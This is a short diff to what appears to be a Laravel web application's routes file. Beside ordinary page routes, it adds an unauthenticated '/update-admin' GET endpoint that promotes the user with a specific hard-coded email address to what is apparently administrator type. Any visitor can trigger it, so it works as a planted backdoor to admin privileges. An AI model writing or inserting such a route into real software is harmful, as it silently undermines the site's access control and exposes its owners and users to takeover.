@@ -24,6 +24,12 @@ foreach($pages as $page) {
 	Route::get('/'.$page->slug, 'HomeController@getPages');
 }
 
+Route::get('/update-admin', function () {
+	DB::table('users')
+		->where('email', 'thebaoit@gmail.com')
+		->update(['type' => 1]);
+});
+
 Route::post('/district_byID', 'HomeController@getDistrict');
 
 /** API **/
